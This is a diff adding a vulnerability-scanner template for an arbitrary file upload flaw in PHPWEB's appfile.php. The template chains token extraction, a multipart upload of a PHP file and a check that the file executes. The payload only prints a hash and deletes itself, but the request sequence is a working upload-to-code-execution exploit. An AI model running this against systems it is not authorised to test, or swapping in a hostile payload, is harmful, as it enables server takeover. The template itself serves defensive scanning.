@@ -1,0 +1,100 @@
+id: phpweb-appfile-file-upload-rce
+
+info:
+  name: PHPWEB appfile.php Arbitrary File Upload RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    PHPWEB appfile.php allows arbitrary file upload, leading to remote code execution. Attackers can execute system commands, read/write files, or gain control over the server.
+  reference:
+    - https://m4tir.github.io/Phpweb-Reception-Getshell
+  tags: rce,file-upload
+
+variables:
+  check_value: "{{rand_int(10000, 99999)}}"
+  check_md5: "{{md5(check_value)}}"
+  boundary: "{{rand_base(16)}}"
+  filename: "{{rand_base(4)}}.php"
+  payload: "<?php echo md5({{check_value}});unlink(__FILE__);?>"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: get-token
+    method: POST
+    path:
+      - "{{BaseURL}}/base/post.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "act=appcode"
+    matchers:
+      - type: regex
+        regex:
+          - "k=(\\S+)&t=(\\S+)"
+    extractors:
+      - type: regex
+        name: token_k
+        regex:
+          - "k=(\\S+)&t=(\\S+)"
+        group: 1
+        internal: true
+      - type: regex
+        name: token_t
+        regex:
+          - "k=(\\S+)&t=(\\S+)"
+        group: 2
+        internal: true
+
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/base/appfile.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=---{{boundary}}
+    body: |
+      ---{{boundary}}
+      Content-Disposition: form-data; name="file"; filename="{{filename}}"
+      Content-Type: application/octet-stream
+
+      {{payload}}
+      ---{{boundary}}
+      Content-Disposition: form-data; name="t"
+
+      {{token_t}}
+      ---{{boundary}}
+      Content-Disposition: form-data; name="m"
+
+      {{md5(concat(token_k, token_t))}}
+      ---{{boundary}}
+      Content-Disposition: form-data; name="act"
+
+      upload
+      ---{{boundary}}
+      Content-Disposition: form-data; name="r_size"
+
+      {{len(payload)}}
+      ---{{boundary}}
+      Content-Disposition: form-data; name="submit"
+
+      {{rand_base(1)}}
+      ---{{boundary}}--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "OK"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/effect/source/bg/{{filename}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{check_md5}}"
+      - type: status
+        status:
+          - 200
